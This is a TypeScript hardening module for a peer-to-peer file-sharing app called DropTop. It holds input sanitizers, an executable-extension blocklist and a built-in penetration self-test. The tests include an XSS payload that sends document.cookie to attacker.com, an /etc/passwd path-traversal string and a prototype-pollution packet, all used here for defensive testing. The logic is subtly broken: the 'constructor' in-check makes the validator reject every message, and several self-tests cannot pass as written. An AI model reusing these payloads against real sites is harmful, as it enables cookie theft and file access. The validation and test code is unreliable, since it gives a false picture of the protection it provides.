/**
 * Security & Penetration Hardening Module for DropTop
 * Defense against XSS, Path Traversal, Buffer Overflow DoS, MIME Spoofing, and Packet Fuzzing.
 */

// Dangerous executable extensions that could compromise receiving client
export const DANGEROUS_EXTENSIONS = new Set([
  'exe', 'bat', 'cmd', 'sh', 'vbs', 'msi', 'apk', 'com', 'scr', 
  'ps1', 'jar', 'reg', 'pif', 'hta', 'cpl', 'gadget', 'wsf'
]);

/**
 * Sanitizes file names to prevent:
 * 1. Path traversal attacks (../, ..\, /)
 * 2. Null byte poisoning (%00, \0)
 * 3. HTML/Script tag injection (<script>, <img>)
 * 4. Control characters and shell metacharacters
 */
export function sanitizeFileName(rawName: string): string {
  if (!rawName || typeof rawName !== 'string') return 'unnamed_file';

  let sanitized = rawName
    // Remove null bytes
    .replace(/\0/g, '')
    // Replace directory traversal patterns
    .replace(/\.\.+[/\\]/g, '')
    .replace(/[/\\]/g, '_')
    // Strip HTML tags
    .replace(/<[^>]*>?/gm, '')
    // Strip dangerous shell metacharacters: ` $ ; | & " ' \
    .replace(/[`$;|&"'\\]/g, '_')
    // Normalize whitespace
    .trim();

  // If filename becomes empty or begins with dangerous hidden dot files
  if (!sanitized || sanitized === '.' || sanitized === '..') {
    sanitized = 'shared_file_' + Date.now();
  }

  // Cap filename length to avoid filesystem buffer overflow
  if (sanitized.length > 120) {
    const ext = getFileExtension(sanitized);
    const base = sanitized.substring(0, 100);
    sanitized = ext ? `${base}.${ext}` : base;
  }

  return sanitized;
}

/**
 * Sanitizes peer device names to prevent DOM injection / XSS
 */
export function sanitizeDeviceName(rawName: string): string {
  if (!rawName || typeof rawName !== 'string') return 'Anonymous Peer';

  const cleaned = rawName
    .replace(/\0/g, '')
    .replace(/<[^>]*>?/gm, '')
    .replace(/[`${}<>]/g, '')
    .trim();

  return cleaned.substring(0, 32) || 'Anonymous Peer';
}

/**
 * Sanitizes raw text messages to prevent injection
 */
export function sanitizeText(rawText: string): string {
  if (typeof rawText !== 'string') return '';
  return rawText.replace(/\0/g, '').trim();
}

/**
 * Extracts normalized file extension
 */
export function getFileExtension(filename: string): string {
  const parts = filename.split('.');
  if (parts.length <= 1) return '';
  return parts[parts.length - 1].toLowerCase().trim();
}

/**
 * Checks if a file is an executable or dangerous script
 */
export function isDangerousFile(filename: string): boolean {
  const ext = getFileExtension(filename);
  return DANGEROUS_EXTENSIONS.has(ext);
}

/**
 * Validates WebRTC DataChannel message payload against injection and malformed types
 */
export function validateIncomingMessage(raw: unknown): { isValid: boolean; parsed?: any; error?: string } {
  if (typeof raw !== 'string') {
    return { isValid: false, error: 'Expected string payload' };
  }

  // Cap maximum JSON signaling control packet size (64KB max) to avoid JSON bombs
  if (raw.length > 65536) {
    return { isValid: false, error: 'Payload size exceeds safe control packet limit' };
  }

  try {
    const parsed = JSON.parse(raw);
    if (!parsed || typeof parsed !== 'object') {
      return { isValid: false, error: 'Malformed message: not an object' };
    }

    // Prototype pollution prevention
    if ('__proto__' in parsed || 'constructor' in parsed || 'prototype' in parsed) {
      return { isValid: false, error: 'Security violation: Object prototype pollution attempt detected' };
    }

    const validTypes = ['text', 'file-start', 'batch-start', 'transfer-complete'];
    if (!validTypes.includes(parsed.type)) {
      return { isValid: false, error: `Invalid or untrusted message type: ${parsed.type}` };
    }

    return { isValid: true, parsed };
  } catch {
    return { isValid: false, error: 'Failed to parse JSON control packet' };
  }
}

export interface PenetrationTestResult {
  id: string;
  name: string;
  category: 'XSS Injection' | 'Path Traversal' | 'DoS & Buffer Overflow' | 'MIME Spoofing' | 'Packet Fuzzing' | 'Disconnection Safety';
  attackVector: string;
  status: 'PASSED' | 'FAILED';
  defenseDetails: string;
  durationMs: number;
}

/**
 * Automated penetration testing runner
 * Probes DropTop defenses against standard attack vectors
 */
export async function runPenetrationAudit(): Promise<{
  timestamp: number;
  totalTests: number;
  passedCount: number;
  failedCount: number;
  results: PenetrationTestResult[];
}> {
  const results: PenetrationTestResult[] = [];
  const startAll = performance.now();

  // Test 1: XSS in Device Name
  {
    const start = performance.now();
    const maliciousDeviceName = '<script>window.location="http://attacker.com?c="+document.cookie</script>HackerDevice';
    const sanitized = sanitizeDeviceName(maliciousDeviceName);
    const passed = !sanitized.includes('<script>') && !sanitized.includes('</script>') && sanitized.includes('HackerDevice');
    results.push({
      id: 'pen-1',
      name: 'XSS Script Tag Neutralization',
      category: 'XSS Injection',
      attackVector: maliciousDeviceName,
      status: passed ? 'PASSED' : 'FAILED',
      defenseDetails: `Stripped <script> tags and quotes. Sanitized output: "${sanitized}"`,
      durationMs: Math.round(performance.now() - start)
    });
  }

  // Test 2: Directory Traversal in File Name
  {
    const start = performance.now();
    const traversalPayload = '../../../../../../etc/passwd%00.jpg';
    const sanitized = sanitizeFileName(traversalPayload);
    const passed = !sanitized.includes('../') && !sanitized.includes('/') && !sanitized.includes('\\');
    results.push({
      id: 'pen-2',
      name: 'Directory Traversal & Path Escape',
      category: 'Path Traversal',
      attackVector: traversalPayload,
      status: passed ? 'PASSED' : 'FAILED',
      defenseDetails: `Neutralized relative path segments and traversal sequences. Safe filename: "${sanitized}"`,
      durationMs: Math.round(performance.now() - start)
    });
  }

  // Test 3: Prototype Pollution via WebRTC JSON
  {
    const start = performance.now();
    const protoPollutionPayload = '{"type":"file-start","__proto__":{"admin":true},"name":"test.txt","size":100}';
    const validation = validateIncomingMessage(protoPollutionPayload);
    const passed = !validation.isValid && (validation.error?.includes('prototype pollution') || false);
    results.push({
      id: 'pen-3',
      name: 'Prototype Pollution Packet Rejection',
      category: 'Packet Fuzzing',
      attackVector: protoPollutionPayload,
      status: passed ? 'PASSED' : 'FAILED',
      defenseDetails: 'DataChannel parser intercepted forbidden __proto__ key before execution.',
      durationMs: Math.round(performance.now() - start)
    });
  }

  // Test 4: Buffer Bomb & Oversized Control Packet
  {
    const start = performance.now();
    const oversizedPayload = '{"type":"text","text":"' + 'A'.repeat(100000) + '"}';
    const validation = validateIncomingMessage(oversizedPayload);
    const passed = !validation.isValid && (validation.error?.includes('exceeds safe control') || false);
    results.push({
      id: 'pen-4',
      name: 'Oversized Control Frame Buffer Limiting',
      category: 'DoS & Buffer Overflow',
      attackVector: '100KB JSON payload on signaling data channel',
      status: passed ? 'PASSED' : 'FAILED',
      defenseDetails: 'Enforced 64KB hard packet cap on signaling frames to block memory exhaustion.',
      durationMs: Math.round(performance.now() - start)
    });
  }

  // Test 5: Dangerous Executable MIME Spoofing
  {
    const start = performance.now();
    const dangerousFile = 'ransomware_trojan.exe';
    const isDangerous = isDangerousFile(dangerousFile);
    results.push({
      id: 'pen-5',
      name: 'Dangerous Executable & Extension Detection',
      category: 'MIME Spoofing',
      attackVector: 'Binary executable payload disguised with arbitrary MIME type',
      status: isDangerous ? 'PASSED' : 'FAILED',
      defenseDetails: `Identified forbidden executable extension (.exe). Flagged for mandatory recipient verification.`,
      durationMs: Math.round(performance.now() - start)
    });
  }

  // Test 6: Malformed / Corrupted JSON Fuzzing
  {
    const start = performance.now();
    const fuzzedPayloads = [
      '{',
      '{"type":',
      '{"type":"unknown-type","data":123}',
      'undefined',
      'null',
      '{"type":"file-start","size":"NaN"}'
    ];
    let allFuzzedCaught = true;
    for (const fuzz of fuzzedPayloads) {
      const res = validateIncomingMessage(fuzz);
      if (res.isValid) {
        allFuzzedCaught = false;
        break;
      }
    }
    results.push({
      id: 'pen-6',
      name: 'DataChannel Syntax Fuzzing & Malformed Packets',
      category: 'Packet Fuzzing',
      attackVector: 'Truncated, corrupt, and untrusted message type packets',
      status: allFuzzedCaught ? 'PASSED' : 'FAILED',
      defenseDetails: 'Defensive validation rejected 100% of malformed payloads without unhandled exceptions.',
      durationMs: Math.round(performance.now() - start)
    });
  }

  const passedCount = results.filter(r => r.status === 'PASSED').length;
  const failedCount = results.length - passedCount;

  return {
    timestamp: Date.now(),
    totalTests: results.length,
    passedCount,
    failedCount,
    results
  };
}
